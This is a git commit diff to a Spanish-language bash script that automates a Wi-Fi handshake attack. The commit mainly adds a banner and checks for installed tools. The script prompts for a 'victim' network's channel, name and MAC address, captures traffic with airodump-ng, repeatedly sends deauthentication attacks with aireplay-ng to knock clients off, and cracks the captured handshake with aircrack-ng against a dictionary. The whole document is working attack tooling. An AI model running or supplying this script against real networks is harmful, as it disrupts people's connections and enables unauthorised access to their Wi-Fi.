6400be8aedca3174ec7786d6e1c6959cd65b14a4
MMAGANADEBIA <mmaganadebia@localhost.localdomain>
2020-08-20 22:20:15 -0500

    tools verif & banner

--- handshake_automation.sh
+++ handshake_automation.sh
@@ -1,14 +1,43 @@
-# E8:ED:05:BA:1B:D0!/bin/bash
+#!/bin/bash
 clear
-
+figlet handshake automation
+echo "Escrito por: mmaganadebia."
+echo ""
 read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision
 
 firstTerminal(){
-  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $name wlan0mon &
+  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac wlan0mon &
+}
+
+aircrackInstall(){
+  read -p "¿Quieres instalar aircrack-ng? Es necesaria (si/no)" aircrackDecision
+  case $aircrackDecision in
+    si)
+      sudo apt-get install aircrack-ng
+      ;;
+    no)
+     echo "Saliendo del script..."
+  esac
+}
+
+figletInstall(){
+  read -p "¿Quieres instalar fliglet? solo es para el banner (si / no)" figletDecision
+  case $figletDecision  in
+    si)
+      sudo apt-get install figlet
+      ;;
+    no)
+      echo "Correcto..."
+  esac
+}
+
+verifTools(){
+  sudo dpkg -l aircrack-ng &> /dev/null && echo "aircrack-ng instalada..." || aircrackInstall
+  sudo dpkg -l figlet &> /dev/null && echo "figlet instalado..." || figletInstall
 }
 
 deauthentication(){
-  read -p "¿Quieres enviar otro ataque de desautenticación? (si / no)" deauth
+  read -p "¿Quieres enviar otro ataque de desautenticación? (si / no) " deauth
   case $deauth in
     si)
       sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
@@ -24,7 +53,7 @@ dictionariOrSave(){
   case $doc in
     D)
       read -p "Escribe la ruta del diccionario: " diccionario
-      xterm -hold -e sudo aircrack-ng "$name"'-01.cap' -w "$diccionario" &
+      xterm -hold -e sudo aircrack-ng "$red"'-01.cap' -w "$diccionario" &
       sudo service NetworkManager start
       sudo airmon-ng stop wlan0mon
       exit
@@ -40,6 +69,8 @@ dictionariOrSave(){
 
 case $firstDecision in
   si)
+    echo "Verificando herramientas instaladas"
+    verifTools
     echo "Comenzando..."
     echo "Matando procesos que pueden interferir..."
     sudo airmon-ng check kill
@@ -52,7 +83,6 @@ case $firstDecision in
     read -p "Canal de la victima: " canal
     read -p "Nombre de la red: " red
     read -p "Direccion MAC: " mac 
-    read -p "Nombre del archivo resultante: " name
     firstTerminal 
     sleep 5s 
     sudo aireplay-ng -0 10 -a $mac  -e $red wlan0mon
@@ -60,5 +90,7 @@ case $firstDecision in
     ;;
   no)
     echo "Saliendo del script."
+    echo "¡Adios!"
+    sleep 2s
     exit
 esac
